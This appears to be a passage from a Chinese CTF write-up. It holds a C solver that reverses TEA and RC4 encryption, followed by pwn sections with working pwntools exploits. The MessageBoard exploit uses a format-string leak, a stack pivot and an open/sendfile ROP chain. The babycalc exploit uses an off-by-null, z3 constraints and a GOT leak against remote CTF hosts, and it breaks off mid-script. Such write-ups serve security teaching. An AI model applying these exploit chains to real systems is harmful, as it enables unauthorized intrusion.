<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> e[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x94</span>, <span class="number">0x39</span>, <span class="number">0x07</span>, <span class="number">0x5C</span>, <span class="number">0xB3</span>, <span class="number">0x5C</span>, <span class="number">0x80</span>, <span class="number">0x0D</span>, <span class="number">0x86</span>, <span class="number">0xA5</span>, </span><br><span class="line">  <span class="number">0xDD</span>, <span class="number">0x87</span>, <span class="number">0x8E</span>, <span class="number">0xFB</span>, <span class="number">0x17</span>, <span class="number">0x03</span>, <span class="number">0x29</span>, <span class="number">0xEF</span>, <span class="number">0x20</span>, <span class="number">0x65</span>, </span><br><span class="line">  <span class="number">0xAF</span>, <span class="number">0x87</span>, <span class="number">0x49</span>, <span class="number">0x5A</span>, <span class="number">0xA4</span>, <span class="number">0xC2</span>, <span class="number">0x2D</span>, <span class="number">0xEB</span>, <span class="number">0x0E</span>, <span class="number">0x47</span>, </span><br><span class="line">  <span class="number">0xCF</span>, <span class="number">0x38</span>, <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Encrypt</span><span class="params">(<span class="type">uint32_t</span> *v, <span class="type">uint32_t</span> *k)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">1</span>], v1 = v[<span class="number">0</span>];</span><br><span class="line">    <span class="comment">// printf(&quot;0x%x, 0x%x,\n&quot;, v[0], v[1]);</span></span><br><span class="line">    <span class="type">uint32_t</span> sum = <span class="number">0x20000000</span> - (<span class="number">32</span> * <span class="number">0xC95D6ABF</span>);        <span class="comment">/* 初始化 */</span></span><br><span class="line">    <span class="type">uint32_t</span> delta = <span class="number">0xC95D6ABF</span>; <span class="comment">/* 密钥调度常数 */</span></span><br><span class="line">    <span class="type">int</span> n = <span class="number">32</span>;                  <span class="comment">/* 轮数 */</span></span><br><span class="line">    <span class="keyword">while</span> (n-- &gt; <span class="number">0</span>)</span><br><span class="line">    &#123; <span class="comment">/* 基本循环开始 */</span></span><br><span class="line">        sum += delta;</span><br><span class="line">        v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k[<span class="number">2</span>]) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k[<span class="number">0</span>]);</span><br><span class="line">        v1 += ((v0 &lt;&lt; <span class="number">4</span>) + k[<span class="number">1</span>]) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k[<span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*循环结束*/</span></span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Decrypt</span><span class="params">(<span class="type">uint32_t</span> *v, <span class="type">uint32_t</span> *k)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> sum, v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>];</span><br><span class="line">    <span class="type">int</span> n = <span class="number">32</span>;</span><br><span class="line">    <span class="comment">/*初始化*/</span></span><br><span class="line">    <span class="type">uint32_t</span> delta = <span class="number">0xC95D6ABF</span>; <span class="comment">/* 密钥调度常数*/</span></span><br><span class="line">    sum = <span class="number">0x20000000</span>;</span><br><span class="line">    <span class="comment">/*即0xC6EF3720 */</span></span><br><span class="line">    <span class="keyword">while</span> (n-- &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/*基本循环开始*/</span></span><br><span class="line">        v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k[<span class="number">1</span>]) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k[<span class="number">3</span>]);</span><br><span class="line">        v0 += ((v1 &lt;&lt; <span class="number">4</span>) + k[<span class="number">2</span>]) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k[<span class="number">0</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*循环结束*/</span></span><br><span class="line">    v[<span class="number">1</span>] = v0;</span><br><span class="line">    v[<span class="number">0</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">rc4_init</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>*s,<span class="type">unsigned</span> <span class="type">char</span>*key, <span class="type">unsigned</span> <span class="type">long</span> Len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">//char k[256]=&#123;0&#125;;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> k[<span class="number">256</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> tmp=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++) &#123;</span><br><span class="line">        s[i]=i;</span><br><span class="line">        k[i]=key[i%Len];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++) &#123;</span><br><span class="line">        j=(j+s[i]+k[i])%<span class="number">256</span>;</span><br><span class="line">        tmp=s[i];</span><br><span class="line">        s[i]=s[j];<span class="comment">//交换s[i]和s[j]</span></span><br><span class="line">        s[j]=tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">rc4_crypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>*s,<span class="type">unsigned</span> <span class="type">char</span>*Data,<span class="type">unsigned</span> <span class="type">long</span> Len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>,t=<span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> k=<span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> tmp;</span><br><span class="line">    <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;Len;k++)</span><br><span class="line">    &#123;</span><br><span class="line">        i=(i+<span class="number">1</span>)%<span class="number">256</span>;</span><br><span class="line">        j=(j+s[i])%<span class="number">256</span>;</span><br><span class="line">        tmp=s[i];</span><br><span class="line">        s[i]=s[j];<span class="comment">//交换s[x]和s[y]</span></span><br><span class="line">        s[j]=tmp;</span><br><span class="line">        t=(s[i]+s[j])%<span class="number">256</span>;</span><br><span class="line">        Data[k]^=s[t];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;	<span class="comment">//多开一位 不然/0溢出到k了</span></span><br><span class="line">    <span class="type">uint8_t</span> sbox[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">uint32_t</span> input[<span class="number">5</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">uint32_t</span> k[<span class="number">4</span>] = &#123; <span class="number">0x00102030</span>, <span class="number">0x40506070</span>, <span class="number">0x8090A0B0</span>, <span class="number">0xC0D0E0F0</span>&#125;;</span><br><span class="line">    <span class="type">char</span> key [] = &#123;<span class="string">&quot;04e52c7e31022b0b&quot;</span>&#125;;</span><br><span class="line">    <span class="comment">// Encrypt(input, k);</span></span><br><span class="line">    <span class="comment">// Encrypt(input + 2, k);</span></span><br><span class="line">    <span class="comment">// uint32_t enc[4] = &#123;0xda55a5c4, 0x8cccfe38, 0x234d7d23, 0xb63debe2&#125;;</span></span><br><span class="line">    <span class="type">uint32_t</span>* enc = (<span class="type">uint32_t</span>*)e;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0x%x, 0x%x,0x%x,0x%x \n&quot;</span>, enc[<span class="number">0</span>], enc[<span class="number">1</span>], enc[<span class="number">2</span>], enc[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0x%x, 0x%x,0x%x,0x%x \n&quot;</span>, enc[<span class="number">4</span>], enc[<span class="number">5</span>], enc[<span class="number">6</span>], enc[<span class="number">7</span>]);</span><br><span class="line"></span><br><span class="line">    Encrypt(enc, k);</span><br><span class="line">    Encrypt(enc + <span class="number">2</span>, k);</span><br><span class="line">    Encrypt(enc + <span class="number">4</span>, k);</span><br><span class="line">    Encrypt(enc + <span class="number">6</span>, k);</span><br><span class="line">    <span class="comment">// Encrypt(enc + 8, k);</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0x%x, 0x%x,0x%x,0x%x \n&quot;</span>, enc[<span class="number">0</span>], enc[<span class="number">1</span>], enc[<span class="number">2</span>], enc[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0x%x, 0x%x,0x%x,0x%x \n&quot;</span>, enc[<span class="number">4</span>], enc[<span class="number">5</span>], enc[<span class="number">6</span>], enc[<span class="number">7</span>]);</span><br><span class="line">    rc4_init(sbox,key,<span class="built_in">strlen</span>(key));</span><br><span class="line">    rc4_crypt(sbox,enc,<span class="number">8</span>);</span><br><span class="line">    rc4_init(sbox,key,<span class="built_in">strlen</span>(key));</span><br><span class="line">    rc4_crypt(sbox,enc + <span class="number">2</span>,<span class="number">8</span>);</span><br><span class="line">    rc4_init(sbox,key,<span class="built_in">strlen</span>(key));</span><br><span class="line">    rc4_crypt(sbox,enc + <span class="number">4</span>,<span class="number">8</span>);</span><br><span class="line">    rc4_init(sbox,key,<span class="built_in">strlen</span>(key));</span><br><span class="line">    rc4_crypt(sbox,enc + <span class="number">6</span>,<span class="number">8</span>);</span><br><span class="line">    <span class="type">int</span> tmp = <span class="number">0</span>;</span><br><span class="line">    tmp = enc[<span class="number">0</span>];</span><br><span class="line">    enc[<span class="number">0</span>] = enc[<span class="number">1</span>];</span><br><span class="line">    enc[<span class="number">1</span>] = tmp;</span><br><span class="line"></span><br><span class="line">    tmp = enc[<span class="number">2</span>];</span><br><span class="line">    enc[<span class="number">2</span>] = enc[<span class="number">3</span>];</span><br><span class="line">    enc[<span class="number">3</span>] = tmp;</span><br><span class="line"></span><br><span class="line">    tmp = enc[<span class="number">4</span>];</span><br><span class="line">    enc[<span class="number">4</span>] = enc[<span class="number">5</span>];</span><br><span class="line">    enc[<span class="number">5</span>] = tmp;</span><br><span class="line"></span><br><span class="line">    tmp = enc[<span class="number">6</span>];</span><br><span class="line">    enc[<span class="number">6</span>] = enc[<span class="number">7</span>];</span><br><span class="line">    enc[<span class="number">7</span>] = tmp;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>((<span class="type">char</span> *)enc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="pwn-部分"><a href="#pwn-部分" class="headerlink" title="pwn 部分"></a>pwn 部分</h2><h3 id="MessageBoard"><a href="#MessageBoard" class="headerlink" title="MessageBoard"></a>MessageBoard</h3><p>迁移栈到bss段上，执行<code>open + sendfile</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">os.environ[<span class="string">&#x27;PWNLIB_NOTERM&#x27;</span>] = <span class="string">&#x27;True&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;/usr/bin/x-terminal-emulator&#x27;</span>, <span class="string">&#x27;-e&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;0x0000000000023b6a: pop rdi; ret; &#x27;&#x27;&#x27;</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000023b6a</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;0x000000000002601f: pop rsi; ret; &#x27;&#x27;&#x27;</span></span><br><span class="line">pop_rsi =  <span class="number">0x000000000002601f</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;0x0000000000142c92: pop rdx; ret; &#x27;&#x27;&#x27;</span></span><br><span class="line">pop_rdx = <span class="number">0x0000000000142c92</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;0x000000000010257e: pop rcx; pop rbx; ret; &#x27;&#x27;&#x27;</span></span><br><span class="line">pop_rcx_rbx = <span class="number">0x000000000010257e</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;tcp.cloud.dasctf.com&quot;</span>,<span class="number">24809</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process([&#x27;../xhljmessgeboard&#x27;])</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;../xhljmessgeboard&#x27;</span>)</span><br><span class="line">so = ELF(<span class="string">&quot;../libc.so.6&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;name:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;%31$p&quot;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Hello, &quot;</span>)</span><br><span class="line">addr = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>) - <span class="number">243</span> - so.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">so.address = addr</span><br><span class="line"><span class="comment"># addr = u64(p.recv(6).ljust(8,&quot;\x00&quot;)) - 243 - so.sym[&#x27;__libc_start_main&#x27;]</span></span><br><span class="line">success(<span class="string">&quot;addr =&gt; &quot;</span> + <span class="built_in">hex</span>(addr))</span><br><span class="line">p.send(cyclic(<span class="number">0xb0</span>) + p64(elf.bss(<span class="number">0x150</span>)) + p64(<span class="number">0x401378</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&quot;/flag\x00\x00\x00&quot;</span> + p64(pop_rdi + addr) + p64(elf.bss(<span class="number">0x150</span>) - <span class="number">0xb0</span>)</span><br><span class="line">payload += p64(pop_rsi + addr) + p64(<span class="number">0</span>) + p64(so.sym[<span class="string">&#x27;open&#x27;</span>])</span><br><span class="line">payload += p64(pop_rdi + addr ) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi + addr ) + p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rdx + addr ) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rcx_rbx + addr ) + p64(<span class="number">0x7fff</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(so.sym[<span class="string">&#x27;sendfile&#x27;</span>])</span><br><span class="line">payload = payload.ljust(<span class="number">0xb0</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(elf.bss(<span class="number">0x150</span>)- <span class="number">0xb0</span>) + p64(<span class="number">0x4013a2</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="babycalc"><a href="#babycalc" class="headerlink" title="babycalc"></a>babycalc</h3><p><code>off-by-null</code>+ 任意写一个字节</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;number-%d:&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)(i + <span class="number">1</span>));</span><br><span class="line">    buf[(<span class="type">int</span>)read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL)] = <span class="number">0</span>;</span><br><span class="line">    v0 = strtol(buf, <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">    v3[i] = v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>z3先上</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span>  z3 <span class="keyword">import</span>  *</span><br><span class="line">v5 = Int(<span class="string">&#x27;v5&#x27;</span>)</span><br><span class="line">v4 = Int(<span class="string">&#x27;v4&#x27;</span>)</span><br><span class="line">v3 = Int(<span class="string">&#x27;v3&#x27;</span>)</span><br><span class="line">v6 = Int(<span class="string">&#x27;v6&#x27;</span>)</span><br><span class="line">v13 = Int(<span class="string">&#x27;v13&#x27;</span>)</span><br><span class="line">v16 = Int(<span class="string">&#x27;v16&#x27;</span>)</span><br><span class="line">v8 = Int(<span class="string">&#x27;v8&#x27;</span>)</span><br><span class="line">v9 = Int(<span class="string">&#x27;v9&#x27;</span>)</span><br><span class="line">v8 = Int(<span class="string">&#x27;v8&#x27;</span>)</span><br><span class="line">v7 = Int(<span class="string">&#x27;v7&#x27;</span>)</span><br><span class="line">v10 = Int(<span class="string">&#x27;v10&#x27;</span>)</span><br><span class="line">v15 = Int(<span class="string">&#x27;v15&#x27;</span>)</span><br><span class="line">v18 = Int(<span class="string">&#x27;v18&#x27;</span>)</span><br><span class="line">v11 = Int(<span class="string">&#x27;v11&#x27;</span>)</span><br><span class="line">v12 = Int(<span class="string">&#x27;v12&#x27;</span>)</span><br><span class="line">v14 = Int(<span class="string">&#x27;v14&#x27;</span>)</span><br><span class="line">v17 = Int(<span class="string">&#x27;v17&#x27;</span>)</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">s.add(v5 * v4 * v3 - v6 == <span class="number">36182</span>)</span><br><span class="line">s.add(v3 == <span class="number">19</span>)</span><br><span class="line">s.add(v5 * <span class="number">19</span> * v4 + v6 == <span class="number">36322</span>)</span><br><span class="line">s.add((v13 + v3 - v8) * v16 == <span class="number">32835</span>)</span><br><span class="line">s.add((v4 * v3 - v5) * v6 == <span class="number">44170</span>)</span><br><span class="line">s.add((v5 + v4 * v3) * v6 == <span class="number">51590</span>)</span><br><span class="line">s.add(v9 * v8 * v7 - v10 == <span class="number">61549</span>)</span><br><span class="line">s.add(v10 * v15 + v4 + v18 == <span class="number">19037</span>)</span><br><span class="line">s.add(v9 * v8 * v7 + v10 == <span class="number">61871</span>)</span><br><span class="line">s.add((v8 * v7 - v9) * v10 == <span class="number">581693</span>)</span><br><span class="line">s.add(v11 == <span class="number">50</span>)</span><br><span class="line">s.add((v9 + v8 * v7) * v10 == <span class="number">587167</span>)</span><br><span class="line">s.add(v13 * v12 * v11 - v14 == <span class="number">1388499</span>)</span><br><span class="line">s.add(v13 * v12 * v11 + v14 == <span class="number">1388701</span>)</span><br><span class="line">s.add((v12 * v11 - v13) * v14 == <span class="number">640138</span>)</span><br><span class="line">s.add((v11 * v5 - v16) * v12 == <span class="number">321081</span>)</span><br><span class="line">s.add((v13 + v12 * v11) * v14 == <span class="number">682962</span>)</span><br><span class="line">s.add(v17 * v16 * v15 - v18 == <span class="number">563565</span>)</span><br><span class="line">s.add(v17 * v16 * v15 + v18 == <span class="number">563571</span>)</span><br><span class="line">s.add(v14 == <span class="number">101</span>)</span><br><span class="line">s.add((v16 * v15 - v17) * v18 == <span class="number">70374</span>)</span><br><span class="line">s.add((v17 + v16 * v15) * v18 == <span class="number">70518</span>)</span><br><span class="line"><span class="built_in">print</span>(s.check())</span><br><span class="line"><span class="built_in">print</span>(s.model())</span><br></pre></td></tr></table></figure>

<p>修改返回地址低位到<code>leave; ret;</code>，同时<code>rbp</code>低位被清零，在远程环境下，<code>rsp</code>能刚好落在第一次输入的<code>[0:0x100 - 0x30]</code>附近</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">os.environ[<span class="string">&#x27;PWNLIB_NOTERM&#x27;</span>] = <span class="string">&#x27;True&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;/usr/bin/x-terminal-emulator&#x27;</span>, <span class="string">&#x27;-e&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		p = remote(<span class="string">&quot;tcp.cloud.dasctf.com&quot;</span>, <span class="number">22492</span>)</span><br><span class="line">		<span class="comment"># p = process([&#x27;../babycalc&#x27;])</span></span><br><span class="line">		elf = ELF(<span class="string">&#x27;../babycalc&#x27;</span>)</span><br><span class="line">		payload = <span class="string">&quot;24\x00\x00&quot;</span> + p32(<span class="number">0</span>)</span><br><span class="line">		payload += p64(<span class="number">0x0400BB8</span>) * <span class="number">20</span> + p64(<span class="number">0x400CA3</span>) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]) + p64(<span class="number">0x400C1A</span> ) + p64(<span class="number">0x400789</span>)</span><br><span class="line">		payload += p8(<span class="number">19</span>) + p8(<span class="number">36</span>) + p8(<span class="number">53</span>) + p8(<span class="number">70</span>) + p8(<span class="number">55</span>) + p8(<span class="number">66</span>) + p8(<span class="number">17</span>) + p8(<span class="number">161</span>)</span><br><span class="line">		payload += p8(<span class="number">50</span>) + p8(<span class="number">131</span>) + p8(<span class="number">212</span>) + p8(<span class="number">101</span>) + p8(<span class="number">118</span>) + p8(<span class="number">199</span>) + p8(<span class="number">24</span>) + p8(<span class="number">3</span>)</span><br><span class="line">		payload += p32(<span class="number">0x400BB8</span>) * <span class="number">1</span> + p64(<span class="number">0x400CA3</span>) + p64(<span class="number">0x602000</span>) + p64(<span class="number">0x4007B4</span>) + p32(<span class="number">0x38</span>)</span><br><span class="line">		p.send(payload)</span><br><span class="line">		p.recvuntil(<span class="string">&quot;good done\n&quot;</span>)</span><br><span class="line">		puts = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">		success(<span class="string">&quot;puts =&gt; &quot;</span> + <span class="built_in">hex</span>(puts))</span><br><span class="line">		addr = puts - <span class="number">0x06f6a0</span></span><br><span 